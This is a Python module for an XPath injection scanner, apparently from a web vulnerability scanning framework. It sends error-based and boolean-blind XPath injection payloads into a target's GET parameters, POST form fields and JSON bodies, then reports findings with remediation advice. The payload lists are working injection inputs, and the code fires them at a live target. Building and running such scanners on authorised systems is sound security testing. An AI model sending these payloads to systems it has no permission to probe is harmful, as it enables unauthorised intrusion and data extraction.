"""
xpath_scanner.py — XPath Injection Scanner
==========================================
Expert-grade rewrite (GAP-010 fix):
  1. Error-based detection (original)
  2. Boolean-blind inference (true/false response comparison)
  3. POST form parameter testing
  4. JSON body XPath injection
  5. Timing-based confirmation as fallback
"""
import json, urllib.parse
from scanners.base_scanner import BaseScanner

# ── Error-based payloads ──────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "1' or '1'='1' or '1'='1",
    "'] | //user/*[contains(.,'",
    "') or ('1'='1",
    "' and count(//*)>0 and '1'='1",
    "\" or \"1\"=\"1",
    "x' or name()='username' or 'x'='y",
]

# ── Boolean-blind pairs: (true_payload, false_payload) ───────────────────
BLIND_PAIRS = [
    ("' or '1'='1",      "' or '1'='2"),
    ("' or 1=1 or 'a'='a", "' or 1=2 or 'a'='b"),
    ("admin' or '1'='1", "admin' or '1'='2"),
    ("x' or string-length(name())>0 or 'x'='y", "x' or string-length(name())>9999 or 'x'='y"),
]

XPATH_ERRORS = [
    "xpath", "xmldom", "xml parsing error", "invalid predicate",
    "unterminated", "expected node", "xmlerror", "lxml.etree",
    "xpathexception", "xpatherror", "invalid expression",
    "org.jaxen", "javax.xml.xpath", "net.sf.saxon",
    "SimpleXML", "xpath query", "xpathresult",
]


class XpathScanner(BaseScanner):
    SCANNER_NAME = "XPath Injection Scanner"
    _SCANNER_KEY = "xpath"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[XPath] Testing XPath injection on {self.target}...")

        # 1. GET query parameters — error-based
        self._test_get_error_based()
        if self.vulns: return self.vulns

        # 2. GET query parameters — boolean-blind
        self._test_get_blind()
        if self.vulns: return self.vulns

        # 3. POST form parameters
        self._test_post_forms()
        if self.vulns: return self.vulns

        # 4. JSON body
        self._test_json_body()

        if not self.vulns:
            self.log("SUCCESS", "[XPath] No XPath injection detected.")
        return self.vulns

    # ── 1. GET error-based ────────────────────────────────────────────────
    def _test_get_error_based(self):
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs: return

        for k, _ in qs:
            for payload in ERROR_PAYLOADS:
                url = self._inject_qs(parsed, qs, k, payload)
                resp, status = self._make_request(url)
                if resp and self._has_xpath_error(resp):
                    self._report_error(f"GET param `{k}`", payload, resp, confidence="Confirmed")
                    return

    # ── 2. GET boolean-blind ──────────────────────────────────────────────
    def _test_get_blind(self):
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs: return

        baseline, _ = self._make_request(self.target)
        if not baseline: return

        for k, _ in qs:
            for true_p, false_p in BLIND_PAIRS:
                url_true  = self._inject_qs(parsed, qs, k, true_p)
                url_false = self._inject_qs(parsed, qs, k, false_p)

                resp_true,  status_true  = self._make_request(url_true)
                resp_false, status_false = self._make_request(url_false)

                if resp_true is None or resp_false is None: continue

                # Clear behavioral difference between true and false payload
                len_diff = abs(len(resp_true) - len(resp_false))
                status_diff = (status_true != status_false)
                content_diff = (resp_true != resp_false and len_diff > 50)

                if status_diff or content_diff:
                    self.log("CRITICAL",
                        f"[XPath] Boolean-blind XPath: param=`{k}` "
                        f"true_len={len(resp_true)} false_len={len(resp_false)} "
                        f"status_diff={status_diff}")
                    self.add_vuln(
                        title=f"Blind XPath Injection in GET parameter `{k}`",
                        severity="High",
                        category="XPath Injection",
                        cvss_score=7.5,
                        confidence="High",
                        references=["https://owasp.org/www-community/attacks/XPATH_Injection"],
                        description=(
                            f"**Boolean-blind XPath injection** detected in GET parameter `{k}`.\n\n"
                            f"**True payload:** `{true_p}` → {len(resp_true)} bytes (HTTP {status_true})\n"
                            f"**False payload:** `{false_p}` → {len(resp_false)} bytes (HTTP {status_false})\n\n"
                            "The application produces detectably different responses for logically "
                            "true vs false XPath expressions, confirming user input is directly "
                            "embedded into XPath queries without parameterization."
                        ),
                        remediation=(
                            "1. Use **parameterized XPath** queries — never concatenate user input.\n"
                            "2. In Java: use `XPathVariableResolver` or prepared XPath expressions.\n"
                            "3. Sanitize inputs: reject single quotes, brackets, pipe characters.\n"
                            "4. Apply a WAF rule blocking XPath operators (`//`, `*`, `[`, `]`)."
                        ),
                        payload=f"True: {true_p} | False: {false_p}",
                    )
                    return

    # ── 3. POST forms ─────────────────────────────────────────────────────
    def _test_post_forms(self):
        import re
        html, _ = self._make_request(self.target)
        if not html: return

        forms = re.findall(r'<form[^>]*>.*?</form>', html, re.S | re.I)
        for form_html in forms[:3]:
            action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
            action = self._resolve_url(action_m.group(1) if action_m else "")
            fields = re.findall(r'name=["\']([^"\']+)["\']', form_html, re.I)

            for field in fields:
                for payload in ERROR_PAYLOADS[:4]:
                    data = urllib.parse.urlencode(
                        {f: (payload if f == field else "test") for f in fields}
                    ).encode()
                    resp, status = self._make_request(
                        action, "POST", data,
                        {"Content-Type": "application/x-www-form-urlencoded"}
                    )
                    if resp and self._has_xpath_error(resp):
                        self._report_error(f"POST form field `{field}`", payload, resp, "Confirmed")
                        return

    # ── 4. JSON body ──────────────────────────────────────────────────────
    def _test_json_body(self):
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        params = [k for k, _ in qs] or ["username", "query", "search", "id"]

        api_endpoints = [
            self.target,
            f"{parsed.scheme}://{parsed.netloc}/api/search",
            f"{parsed.scheme}://{parsed.netloc}/api/query",
        ]

        for url in api_endpoints[:2]:
            for param in params[:3]:
                for payload in ERROR_PAYLOADS[:3]:
                    data = json.dumps({param: payload}).encode()
                    resp, status = self._make_request(
                        url, "POST", data, {"Content-Type": "application/json"}
                    )
                    if resp and self._has_xpath_error(resp):
                        self._report_error(f"JSON body param `{param}`", payload, resp, "Confirmed")
                        return

    # ── Helpers ───────────────────────────────────────────────────────────
    def _has_xpath_error(self, response: str) -> bool:
        r = response.lower()
        return any(e in r for e in XPATH_ERRORS)

    def _inject_qs(self, parsed, qs, target_key, payload) -> str:
        new_qs = [(k, (payload if k == target_key else v)) for k, v in qs]
        return parsed._replace(query=urllib.parse.urlencode(new_qs)).geturl()

    def _resolve_url(self, action: str) -> str:
        if not action: return self.target
        if action.startswith("http"): return action
        p = urllib.parse.urlparse(self.target)
        if action.startswith("/"):
            return f"{p.scheme}://{p.netloc}{action}"
        return f"{self.target.rstrip('/')}/{action}"

    def _report_error(self, vector: str, payload: str, response: str, confidence: str):
        self.log("CRITICAL", f"[XPath] Error-based injection confirmed: {vector}")
        self.add_vuln(
            title=f"XPath Injection via {vector}",
            severity="High",
            category="XPath Injection",
            cvss_score=7.5,
            confidence=confidence,
            references=[
                "https://owasp.org/www-community/attacks/XPATH_Injection",
                "https://cwe.mitre.org/data/definitions/643.html",
            ],
            description=(
                f"XPath injection confirmed via **{vector}**.\n\n"
                f"**Payload:** `{payload}`\n"
                "The server's XPath error message leaked in the response, confirming that user "
                "input is directly concatenated into XPath queries. An attacker can extract "
                "the full XML document structure (usernames, passwords, config) via blind enumeration."
            ),
            remediation=(
                "1. Use **parameterized XPath** — never concatenate user input into XPath strings.\n"
                "2. Java: use `XPathVariableResolver` interface or Saxon's safe compilation.\n"
                "3. Suppress XPath error messages in production (generic 500 page only).\n"
                "4. Validate inputs with a strict allowlist before using in XML queries.\n"
                "5. Apply principle of least privilege to XML data stores."
            ),
            payload=payload,
        )
